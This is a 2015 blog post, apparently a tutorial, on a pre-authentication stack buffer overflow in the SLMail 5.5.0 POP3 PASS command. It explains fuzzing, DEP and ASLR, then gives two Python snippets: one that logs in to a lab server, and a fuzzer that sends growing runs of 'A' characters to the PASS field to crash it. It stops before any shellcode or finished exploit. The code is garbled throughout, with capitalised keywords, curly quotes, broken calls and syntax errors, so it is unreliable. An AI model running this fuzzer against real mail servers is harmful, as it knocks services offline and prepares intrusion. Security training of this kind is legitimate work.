---
layout: post
title: "Stack Buffer Overflow Attack"
date: 2015-09-30 09:21:59
image: '/assets/img/'
description:
tags:
categories:
twitter_text:
---

#Stack Buffer Overflow Attack

Before describing a buffer overflow one must understanding what fuzzing is, Fuzzing in nutshell an application or protocol based fuzzing involved sending a malformed data into application and network protocol input and observing unexpected crashes, an unexpected crash indicated that the application or network protocol might not sanitize or filter certain end user input correctly, this likely lead to discovering an exploitable weakness.

Vulnerability in SLMail 5.50 MTA agent buffer overflow was found by NGSSoftware (Insight security researcher and effected the POP3 PASS command which provided during user login, the major issue with that vulnerability in SLMail 5.5.0 is Pre authentication, as an attacker would not need to have credentials to trigger and exploit this vulnerability.

In short the SLMail software was not compiled with data execution prevention (DEP) or Address space layout randomization (ALSR) is technology used to help prevent shellcode from begin successful, it does this by randomly offsetting the location of certain modules and certain memory by randomizing the offsets, however DEP prevents specific memory sector i.e. STACK from being exploited by executing malicious shellcode.

[http://en.wikipedia.org/wiki/Data_Execution_Prevention](http://en.wikipedia.org/wiki/Data_Execution_Prevention/)
[http://en.wikipedia.org/wiki/ASLR](http://en.wikipedia.org/wiki/ASLR)

##Intracting with SLmail using python


    # Net cat equivalent

    #!/bin/usr/python

    Import socket

    S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    Try:

    Print “Send some bad buffer \n”

    s.connect((192.168.209.128,110))

    banner = s.recv(1024)

    s.send(‘USER zane\r\n’)

    banner.recv(1024)

    print banner

    s.send(‘PASS password\r\n’)

    banner.recv(1024)

    print banner

    s.close()

    print (“all done”)

    except:

    print(“Could not connect to POP3 clear text protocol J “)


##Fuzzing SMail

    Import socket

    # we create a buffer with size of 100 bytes

    Buffer =[‘A’]

    Counter = 100

    While len(buffer) <= 30:

    Buffer.append(“A”*counter)

    Counter = counter+200

for hexstrings in buffer:


    print “Fuzzing the PASS field with % bytes % len(string)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    connection = s.connect((“192.168.209.131”,110)

    s.recv(1024) # banner

    s.send(‘USER , sadi\r\n’)

    s.recv(1024) # recv minimal from server

    s.send(‘PASS’ + hexstrings r+ ‘\r\n’) # send our hex stuffs to PASS field and see if sever crash

    s.close(‘QUIT\r\n’) #

Just before we fuzz and send large numbers of byte and crash the SLMAIL pop 3 server I would like to introduce you to Immunity debugger, is a hacker tool a way to write exploits, analyse malware, reverse engineer binary files, the best part about immunity debugger it has s solid user-friendly graph, through out creating an exploit for SLMail POP3 server I will be using Immunity debugger to attack and analyse stack.

Inline-style: 
![Test Image](https://eduservlab.files.wordpress.com/2015/05/3.png "VM Ware")